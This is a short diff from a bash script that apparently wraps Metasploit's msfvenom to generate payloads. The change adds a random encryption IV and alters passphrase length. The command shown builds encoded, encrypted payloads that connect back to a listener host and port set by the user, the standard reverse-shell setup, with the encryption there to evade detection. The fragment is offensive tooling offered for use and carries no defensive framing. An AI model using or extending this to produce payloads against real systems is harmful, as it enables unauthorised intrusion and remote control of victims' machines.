@@ -10409,10 +10409,11 @@ while true; do
 								read -p "(default is empty): " PSSP
 								if [[ "$PSSP" == "" ]];
 								then
-									PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 128)
+									PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)
 								fi
-								echo "Creating a payload encrypted with ""$PSSP"" passphrase"
-								msfvenom -p "$PAY" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
+								MIV=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
+								echo "Creating a payload encrypted with ""$PSSP"" passphrase and ""$MIV"" vector"
+								msfvenom -p "$PAY" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" --encrypt-iv "$MIV" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
 								break
 							done
 							break
